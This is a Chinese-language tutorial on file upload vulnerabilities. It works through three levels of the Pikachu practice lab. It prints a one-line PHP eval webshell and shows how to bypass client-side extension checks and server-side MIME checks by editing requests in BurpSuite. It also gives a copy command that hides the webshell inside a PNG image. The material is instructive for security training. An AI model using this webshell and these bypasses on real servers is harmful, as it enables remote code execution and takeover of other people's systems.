文件上传漏洞，是指后台服务器对前台上传的文件把控不严格。例如文件类型未限制，或者限制不完全，从而导致黑客可以上传木马、病毒等任意文件，并以此获取服务器权限的一种程序缺陷。

比如一个 php 的 cms 系统，这种系统几乎都带有文件上传功能。本意是为了上传图片，但是由于开发人员的疏忽，未对文件类型做限制，这就形成了一个文件上传漏洞。攻击者可以利用此上传点上传 php 木马，拿下整台服务器的控制权限。


以漏洞靶场 Pikachu 作为演示。

第一关，客户端验证。

选择一个一句话木马 1.php，文件内容如下。

<?php @eval($_POST['cmd']);?>

点击开始上传，提示文件不符合要求，上传失败。

查看当前页面的源代码，可以看到这么一段 JS。

function checkFileExt(filename)
{
    var flag = false; //状态
    var arr = ["jpg","png","gif"];
    //取出上传文件的扩展名
    var index = filename.lastIndexOf(".");
    var ext = filename.substr(index+1);
    //比较
    for(var i=0;i<arr.length;i++)
    {
        if(ext == arr[i])
        {
            flag = true; //一旦找到合适的，立即退出循环
            break;
        }
    }
    //条件判断
    if(!flag)
    {
        alert("上传的文件不符合要求，请重新选择！");
        location.reload(true);
    }
}

这里检查了文件扩展名，只允许上传 jpg，png，gif。那么我们只需要把文件扩展名改为这三种之一的任意一种扩展，然后通过 BurpSuite 拦截修改即可。顺便说一下，如果上传文件的时候，一上传马上就提示文件类型不对，大概率是客户端检测，如果是服务端检测的话，一般提示会稍微慢一些。

将 1.php 改为 1.jpg，打开 BurpSuite 并开启请求拦截，同时为浏览器设置好代理，将请求代理到 BurpSuite。点击上传 1.jpg。

拦截到请求，将请求中的 1.jpg 改为 1.php，点击 Forward。

成功上传！并得到相对路径 uploads/1.php，则完整路径为 http://192.168.0.120/vul/unsafeupload/uploads/1.php。

使用菜刀连接。

连接成功。


第二关，服务端验证。

第二关虽然是在服务端对文件做了检查，但是只检查了 MIME 类型，一样可以通过 BurpSuite 修改绕过检查。

服务端代码如下。

if(isset($_POST['submit'])){
//     var_dump($_FILES);
    $mime=array('image/jpg','image/jpeg','image/png');//指定MIME类型,这里只是对MIME类型做了判断。
    $save_path='uploads';//指定在当前目录建立一个目录
    $upload=upload_sick('uploadfile',$mime,$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";
    }
}

既然这一关是在服务端做检查，客户端没做检查，那我就直接上传 1.php。同时使用 BurpSuite 拦截请求。

这里的 Content-Type 即为 MIME，当前是 application/octet-stream，将其改为 image/jpg，点击 Forward。同样上传成功并返回了文件地址。

至此服务端也绕过成功。

继续第三关。

第三关还是在服务端进行检查。并且这里同时校验了文件扩展名和 MIME 信息，服务端代码如下。

if(isset($_POST['submit'])){
    $type=array('jpg','jpeg','png');//指定类型
    $mime=array('image/jpg','image/jpeg','image/png');
    $save_path='uploads'.date('/Y/m/d/');//根据当天日期生成一个文件夹
    $upload=upload('uploadfile','512000',$type,$mime,$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['save_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";

    }
}

看起来似乎没有办法了，我们只能上传图片了。但是我们可以把木马写入到图片中，再结合文件包含漏洞将其引入，一样可以执行木马。这就是传说中的图片马了。

直接使用 Windows 自带的 Cmd 制作一个图片马。

首先准备一张正常的图片 1.png 和一个木马文件 1.php。

打开 Cmd，进入到该目录下，使用如下命令制作图片马。

copy 1.png/b + 1.php/a 2.png

制作成功，新的图片看起来和原来的无异。

用记事本打开该图片，可以看到木马已成功写入。

直接上传 2.png，成功返回地址。进行访问，访问成功。

但是此时里面的木马是不会被解析的，使用菜刀也无法连接。需要结合文件包含漏洞使用，下次讲解一下文件包含漏洞。
